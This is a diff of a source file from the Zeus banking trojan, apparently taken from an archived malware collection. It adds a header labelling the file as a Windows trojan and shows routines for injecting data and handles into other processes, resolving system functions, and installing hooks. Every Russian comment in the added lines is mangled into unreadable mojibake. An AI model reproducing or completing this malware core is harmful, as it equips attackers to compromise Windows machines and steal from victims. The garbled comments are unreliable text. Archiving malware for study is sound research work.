@@ -1,3 +1,14 @@
+/*
+  name      Zeus
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <shlobj.h>
 #include <shellapi.h>
@@ -86,7 +97,7 @@ const static PROCESSRIGHTS processRights[] =
   static HANDLE debugServer; //Hadley flow debyuga.
 
   /*
-  Функция запуска дебюг-сервера.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ-пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
   Return - 0.
   */
@@ -99,7 +110,7 @@ const static PROCESSRIGHTS processRights[] =
 #endif
 
 /*
-  Аналог CWA(kernel32, GetProcAddress).
+  пїЅпїЅпїЅпїЅпїЅпїЅ CWA(kernel32, GetProcAddress).
 */
 static void *__GetProcAddress(HMODULE module, LPSTR name)
 {
@@ -126,16 +137,16 @@ static void *__GetProcAddress(HMODULE module, LPSTR name)
 }
 
 /*
-  Копирование данных в этот модуль в другом процессе.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN process  - процесс для изменения.
-  IN image    - адрес этого модуля в process.
-  IN curVa    - текущий VA данных для копирования.
-  IN data     - данные.
-  IN dataSize - размер данных для копирования.
+  IN process  - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN image    - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ process.
+  IN curVa    - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ VA пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN data     - пїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN dataSize - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return      - true - в случаи успеха,
-                false - в случаи провала.
+  Return      - true - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+                false - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool copyDataToProcess(HANDLE process, void *image, void *curVa, void *data, DWORD dataSize)
 {
@@ -144,15 +155,15 @@ static bool copyDataToProcess(HANDLE process, void *image, void *curVa, void *da
 }
 
 /*
-  Копирование хэндла в этот модуль в другом процессе.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN process - процесс для изменения.
-  IN image   - адрес этого модуля в process.
-  IN curVa   - текущий VA хэндла для копирования.
-  IN handle  - хэндл для копирования.
+  IN process - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN image   - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ process.
+  IN curVa   - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ VA пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN handle  - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return     - true - в случаи успеха,
-               false - в случаи провала.
+  Return     - true - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+               false - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool copyHandleToProcess(HANDLE process, void *image, void *curVa, HANDLE handle)
 {
@@ -168,9 +179,9 @@ static bool copyHandleToProcess(HANDLE process, void *image, void *curVa, HANDLE
 }
 
 /*
-  Получение хэндла kernel32.dll.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ kernel32.dll.
 
-  Return - хэндл.
+  Return - пїЅпїЅпїЅпїЅпїЅ.
 */
 HMODULE _getKernel32Handle(void)
 {
@@ -215,12 +226,12 @@ HMODULE _getKernel32Handle(void)
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
-  Загрузка модулей и функций.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN flags - флаги INITF_*.
+  IN flags - пїЅпїЅпїЅпїЅпїЅ INITF_*.
 
-  Return   - true - в случаи успеха,
-             false - в случаи ошибки.
+  Return   - true - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+             false - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool __inline initLoadModules(DWORD flags)
 {
@@ -286,12 +297,12 @@ static bool __inline initLoadModules(DWORD flags)
 }
 
 /*
-  Основне данные OS.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ OS.
 
-  IN flags - флаги INITF_*.
+  IN flags - пїЅпїЅпїЅпїЅпїЅ INITF_*.
 
-  Return   - true - в случаи успеха,
-             false - в случаи ошибки.
+  Return   - true - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+             false - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool __inline initOsBasic(DWORD flags)
 {
@@ -347,12 +358,12 @@ static bool __inline initOsBasic(DWORD flags)
 }
 
 /*
-  Создание объектов.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN flags - флаги INITF_*.
+  IN flags - пїЅпїЅпїЅпїЅпїЅ INITF_*.
 
-  Return   - true - в случаи успеха,
-             false - в случаи ошибки.
+  Return   - true - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+             false - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool __inline initHandles(DWORD flags)
 {
@@ -379,10 +390,10 @@ static bool __inline initHandles(DWORD flags)
 /*
   These tekschego user.
 
-  IN flags - флаги INITF_*.
+  IN flags - пїЅпїЅпїЅпїЅпїЅ INITF_*.
 
-  Return   - true - в случаи успеха,
-             false - в случаи ошибки.
+  Return   - true - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+             false - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool __inline initUserData(DWORD flags)
 {
@@ -402,12 +413,12 @@ static bool __inline initUserData(DWORD flags)
 }
 
 /*
-  Получение путей.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 
-  IN flags - флаги INITF_*.
+  IN flags - пїЅпїЅпїЅпїЅпїЅ INITF_*.
 
-  Return   - true - в случаи успеха,
-             false - в случаи ошибки.
+  Return   - true - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+             false - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool __inline initPaths(DWORD flags)
 {
@@ -440,12 +451,12 @@ static bool __inline initPaths(DWORD flags)
 }
 
 /*
-  Получение данных базовой конфигурации.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN flags - флаги INITF_*.
+  IN flags - пїЅпїЅпїЅпїЅпїЅ INITF_*.
 
-  Return   - true - в случаи успеха,
-             false - в случаи ошибки.
+  Return   - true - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+             false - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool __inline initBaseConfig(DWORD flags)
 {
@@ -461,10 +472,10 @@ static bool __inline initBaseConfig(DWORD flags)
 /*
   Creation of object names.
 
-  IN flags - флаги INITF_*.
+  IN flags - пїЅпїЅпїЅпїЅпїЅ INITF_*.
 
-  Return   - true - в случаи успеха,
-             false - в случаи ошибки.
+  Return   - true - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+             false - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool __inline initObjects(DWORD flags)
 {
@@ -483,12 +494,12 @@ static bool __inline initObjects(DWORD flags)
 }
 
 /*
-  Получение прав процесса CDPF_RIGHT_*.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ CDPF_RIGHT_*.
 
-  IN flags - флаги INITF_*.
+  IN flags - пїЅпїЅпїЅпїЅпїЅ INITF_*.
 
-  Return   - true - в случаи успеха,
-             false - в случаи ошибки.
+  Return   - true - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+             false - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool __inline initProcessRights(DWORD flags)
 {
@@ -539,10 +550,10 @@ static bool __inline initProcessRights(DWORD flags)
 /*
   Install hooks.
 
-  IN flags - флаги INITF_*.
+  IN flags - пїЅпїЅпїЅпїЅпїЅ INITF_*.
 
-  Return   - true - в случаи успеха,
-             false - в случаи ошибки.
+  Return   - true - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+             false - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool __inline initHooks(DWORD flags)
 {
@@ -709,9 +720,9 @@ void Core::initHttpUserAgent(void)
   if(coreData.httpUserAgent == NULL)
   {
     /*
-      В приципе есть шанс что функция будет вызвана из нескольких потоков одновременно,
-      и произойдет утечка памяти. Но т.к. это не важно в данный момент, не защищаю это вызов
-      крит. секцией. Т.к. все что мы потеряем это утечку менее, чем в 1кб.
+      пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+      пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅ пїЅ.пїЅ. пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+      пїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅ.пїЅ. пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅ 1пїЅпїЅ.
     */
     coreData.httpUserAgent = Wininet::_GetIEUserAgent();
   }
